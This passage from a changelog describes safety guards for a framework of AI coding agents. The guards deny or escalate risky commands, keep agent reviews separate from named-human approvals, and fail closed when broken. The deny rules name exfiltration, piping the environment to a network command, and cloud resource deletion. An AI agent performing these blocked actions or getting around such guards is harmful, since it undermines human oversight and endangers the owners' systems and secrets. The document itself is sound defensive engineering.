deletion across AWS/GCP/Azure), `CLD-02` (credential creation and rotation),
`REG-01` (container image deletion). 39 rules total.

`hook-policy.json` gains a `structural_enforcement` section naming the boundaries
that belong in tool profiles and permission deny rules rather than in a regex.
`templates/project/settings.json` ships 18 structural deny rules.

### Added — stage-local definitions of done

Stage DoD is now primary, with `required_fields_present`, `artifact_owned_by`,
`no_open_blocking_decisions_for`, `decision_resolved`, `evidence_sealed`,
`release_authorized` and `human_identity_recorded` joining the predicate set.
21 predicates, 212 instances across seven workflows, all evaluable.

### Added

- `docs/organization-freeze.md`.
- Six registry invariants and four evaluation cases: `EVAL-GOV-006`,
  `EVAL-REL-004`, `EVAL-SRE-005`, `EVAL-ENG-003`. 50 cases, 28 deterministic.
- 147 tests, up from 132.
- Templates: `open-decision.md`, `evidence.md`.

### Fixed

- The agent-gate purpose check first flagged four legitimate purposes containing
  "the approved stack". It now checks how the purpose **starts**, which is the
  signal that matters.
- `development-lead` owned `DEBT` but its write scope excluded
  `docs/technical-debt/` — found by the new contract-versus-scope check.
- `INC` was marked immutable while listing a modifier, which would have forbidden
  the commander adding timeline entries.

---

### Migration: 0.2.0 → 0.3.0

**Breaking: `agent_gate` requires `purpose`.** Add the dimension each reviewer
checks. A purpose starting with "approve" is rejected.

**Breaking: `.ai-engineering/project.yaml` requires `approval:` and
`observability:`.** Name the human behind each authority. A project without a
named `release_approver` cannot satisfy AP-01, and validation now says so.

**Breaking: `approvals` entries require `id`, `approver_id` and
`approver_role`.** Existing approvals need the identity added.
`approver_role` naming an agent is now an error.

**Breaking: deployment requires an `authorized` release.** Both deploying
workflows have an `AUTHORIZE` stage. A pipeline that deployed from `approved`
must now wait for authorization. Project-local workflows need the stage added.

**Breaking: `team` stages require `team_requirement` and `degraded_mode`.**

**Behaviour change: incidents cannot mitigate before evidence is sealed.** For
non-security incidents this is a short collection step; for security incidents it
is mandatory and blocking.

**Behaviour change: six new command rules.** Cloud resource deletion and
container image deletion are **denied**; credential rotation, production config
edits and production service restarts **escalate**. Check any automation that ran
these from a session.

## [0.2.0] — Second architecture iteration


Addresses ten findings from architecture review. The workflow model from 0.1.0 is
preserved; this release makes it machine-executable and auditable rather than
adding agents.

### Changed — guard failure behaviour is now risk-tiered

The 0.1.0 blanket fail-open was wrong. The moment a guard breaks is the moment it
matters.

- **Tier 0 catastrophic screen** (`hooks/lib/failsafe.py`): pure regex, no file
  I/O, no policy load, running **before** the policy engine. Holds when
  `hook-policy.json` is missing, unparseable or wrong.
- **Tier 1**: on evaluation failure, a high-risk-looking action is **denied**,
  because the system can no longer prove it is safe.
- **Tier 2**: anything else on evaluation failure **escalates** to a human — fail
  closed without bricking the session.
- **Tier 3**: only advisory guards (`guard_spawn`) fail open, with a notice.
- Guards now load their policy with `policy_required()`, so a corrupt rule file
  triggers the failure path instead of degrading to "no rules apply".
- **Session-start self-test**: three known-dangerous payloads are run through the
  safety guards; a failure opens the session with `SAFETY GUARDS ARE NOT WORKING`.

### Added — approval authority, separated from agent verdicts

- `policies/approval-authority.json`. An `agent_gate` blocks but never approves;
  a `human_gate` is a named human's durable decision with `recorded_in`.
- An agent-team lead's plan approval is classified as an **agent gate** and may
  never satisfy an `AP-nn` item. A hook escalation is a decision about one tool
  call, not an approval.
- Artifacts carry `reviewers` (agent verdicts) and `approvals` (human decisions)
  as separate fields that never merge.
- Enforced by validation, by `EVAL-GOV-004`, and by `tests/test_repository.py`.

### Added — formal artifact contracts

- `policies/artifact-model.json`: 19 artifact types with lifecycle, owning role,
  producing stage, required links, agent review and human approval.
- `schemas/artifact-header.schema.json` v2 now requires `version`, `created_at`,
  `updated_at`, `source`, and supports `reviewers`, `approvals`, `dependencies`.
- Two new templates: `incident.md`, `dependency-assessment.md`.

### Added — entry criteria and a checkable definition of done

- Every stage now declares `entry_criteria`, `actions`, `produces`,
  `definition_of_done`, `risk`, `complexity` and `execution`.
- 14 DoD predicates; 165 predicate instances across the seven workflows.
- `scripts/check_dod.py` validates predicate grammar in CI and **evaluates** the
  DoD against a real project. Predicates needing GitLab evidence report
  `REQUIRES-EVIDENCE` and are never counted as passing.

### Added — executable model routing

- `scripts/resolve_model.py` resolves role + risk + complexity to a model and
  effort, printing its reasoning.
- `policies/model-policy.json` gains an override order; a project override below
  the risk floor is refused, and the refusal appears in the trace.
- `.ai-engineering/project.yaml` gains `ai.model_overrides`,
  `ai.execution_overrides` and `ai.agent_teams_available`.

### Added — execution mode and system of record

- `policies/execution-policy.json`: `inline`, `subagent` or `team`, with the
  decision rule and the platform constraints. Teams are used in four places, each
  justified in the stage's `actions`.
- `policies/system-of-record.json`: GitLab and repository artifacts are
  authoritative; the agent-team task list, session transcript and local audit log
  are authoritative for **nothing**.

### Added — dependency work is five routes, not one

`WF-DEPENDENCY` (renamed from "dependency upgrade" to "dependency change") opens
with `CLASSIFY`: `routine-upgrade`, `security-vulnerability`, `end-of-life`,
`licence-compliance`, `new-capability`. Urgency comes from exploitability in this
deployment or a support end date, never from a CVSS score alone.

### Added

- Docs: `docs/approvals.md`, `docs/execution.md`.
- Rule SEC-07: piping the environment to a network command.
- Four evaluation cases: `EVAL-SEC-005`, `EVAL-GOV-004`, `EVAL-GOV-005`,
  `EVAL-AIG-005`. 46 cases, 24 deterministic.
- 132 tests, including 16 covering guard failure behaviour against a sandboxed
  plugin copy.
- CI jobs: `contracts` and `guard-failure-behaviour`.

### Fixed

- `development-lead`, `engineering-director` and `incident-commander` owned
  stages producing artifacts but had no write tool. New `lead` tool profile with
  narrow allow-mode write scopes.
- `dependency-reviewer` defaulted to `haiku`, below the MEDIUM risk floor. Now
  `sonnet`.
- Six workflow stages had an `agent_gate` reviewed by the stage's own owner.
- `minyaml` coerced mapping keys, so a key named `on` became the boolean `true`.

---

### Migration: 0.1.0 → 0.2.0

**Breaking: `approval_gate` is replaced by `agent_gate` and `human_gate`.**
Any project-local workflow file must be updated. `type: independent-agent-review`
becomes an `agent_gate` with a `reviewer`; `type: human` becomes a `human_gate`
with an `approver` and a `recorded_in`. A stage needing both now declares both.

**Breaking: stages require new fields.** `entry_criteria`,
`definition_of_done`, `risk` and `execution` are now required. Validation fails
without them.

**Breaking: artifact headers require more fields.** `version`, `created_at`,
`updated_at` and `source` are now required, and `created`/`updated` are renamed
to `created_at`/`updated_at`. Existing artifacts need the four fields added;
`source` is the one that needs thought, because an artifact with no source was
invented.

**Breaking: `sdlc/workflows/dependency-upgrade.yaml` is now
`dependency-change.yaml`.** Update any reference to the filename. The workflow id
`WF-DEPENDENCY` is unchanged.

**Behaviour change: guards are stricter when broken.** Previously a guard failure
allowed the call. It now denies high-risk actions and escalates everything else.
If a guard is failing in your environment, you will notice — which is the point.
Check `python3 --version` first.

**Behaviour change: three roles gained write tools**, narrowly scoped.
`engineering-director` can write `docs/decisions/**`, `docs/sdlc/**` and
`.ai-engineering/**`; `development-lead` `docs/stories/**` and `docs/qa/**`;
`incident-commander` `docs/incidents/**`. Projects that scope these paths
elsewhere should adjust `policies/write-scope.json` in a fork or raise it as a
governance change.

## [0.1.0] — Initial release


First coherent baseline of the AI Engineering OS. Every component is at
lifecycle status `pilot`: validated, evaluated on its deterministic cases, and
not yet promoted to `production`.

### Organization

- 29 agents across governance, product, architecture, UX, engineering, data, QA,
  security, platform, release, SRE, incident management, documentation and AI
  governance, including five independent specialist reviewers.
- Canonical fifteen-section role contract, enforced by validation.
- `policies/agent-registry.json` as the single source of truth for ownership,
  risk, model, tool profile, spawn authority and evaluation suite.
- Six tool profiles with per-role write scoping.
- Spawn hierarchy with escalation paths; no agent may spawn a CRITICAL role.

### Skills

- 31 skills covering the lifecycle from requirements engineering to root cause
  analysis, plus agent development, evaluation, governance, traceability and
  agent-team patterns.
- Technology-neutral throughout. `kubernetes-basics` is the single
  platform-specific skill and declares its own applicability.

### Guards

- `guard_bash` with 33 rules across destructive filesystem, supply chain,
  protected branches, history rewriting, secret access and exfiltration,
  production access and mutation, destructive data operations and control-plane
  tampering.
- `guard_write` enforcing hard-denied paths, credential-adjacent escalation,
  control-plane escalation, per-role write scope and secret content detection.
- `guard_spawn` enforcing the organizational hierarchy.
- `audit_log` and `session_context`.
- Fail-open-with-notice, never emits `allow`, every denial carries a remediation.
- Project overrides via `.ai-engineering/security.json`, additive by default;
  waivers require a justification and an expiry.

### Lifecycle

- Seven machine-readable workflows: feature delivery, defect fix, incident
  response, dependency upgrade, release, project onboarding, and change to the OS
  itself.
- Stage owners, participants, skills, inputs, outputs, artifacts, exit criteria,
  approval gates and failure paths, all schema-validated.

### Governance

- 14 policy documents: model routing, risk classification, approvals, branching,
  review routing, write scoping, spawn hierarchy, agent lifecycle, evaluation,
  MCP extension, secret patterns, hook rules, tool profiles, agent registry.
- Eleven human-approval categories and an explicit list of what stays autonomous.

### Evaluation

- 42 cases across 15 suites; 20 deterministic and running in CI, 22 LLM-judged
  and reported as pending rather than auto-passed.
- Every suite carries at least one adversarial case, enforced by validation.
- `EVAL-DEV-002` is a permanent false-positive regression case for the guards.

### Tooling

- Zero-dependency validators: plugin structure and cross-document consistency,
  schema validation, project configuration validation, secret scan, evaluation
  runner, agent scaffolder.
- Bundled `minyaml` and `jsonschema_mini` so CI needs no `pip install`.
- 105 tests covering guards, libraries and organizational invariants, including a
  standing false-positive sweep over 70 ordinary development commands and 20
  ordinary write paths.

### Documentation

- Twenty documents plus three worked end-to-end examples.
- `docs/limitations.md` states what V1 cannot do, without workarounds that only
  appear to work.

### Known deviations from the original design

Recorded with reasons in `docs/architecture.md`: `sdlc/` rather than
`workflows/`; no plugin-root `settings.json`; no `.mcp.json`; organizational
metadata in a registry rather than agent frontmatter; agent-team patterns as
prompts rather than configuration; no `senior-*` agents.
